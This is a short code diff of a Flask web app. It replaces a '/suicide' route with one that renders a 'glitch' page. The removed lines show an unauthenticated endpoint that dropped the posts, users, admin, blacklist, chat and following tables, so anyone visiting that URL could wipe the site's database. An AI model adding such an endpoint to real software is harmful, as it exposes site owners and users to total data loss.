@@ -445,22 +445,9 @@ def category(id):
         "category.html", results=result, allposts=allposts, cat=cat, likes=likes
     )
 
-@app.route("/suicide")
+@app.route("/glitch")
 def suicide():
-    db = get_db()
-
-    db.executescript("""
-        DROP TABLE IF EXISTS posts;
-        DROP TABLE IF EXISTS users;
-        DROP TABLE IF EXISTS admin;
-        DROP TABLE IF EXISTS blacklist;
-        DROP TABLE IF EXISTS chat;
-        DROP TABLE IF EXISTS following;
-    """)
-
-    db.commit()
-
-    return render_template("home.html")
+    return render_template("glitch.html")
 
 @app.route("/userposts/<username>")
 def userposts(username):
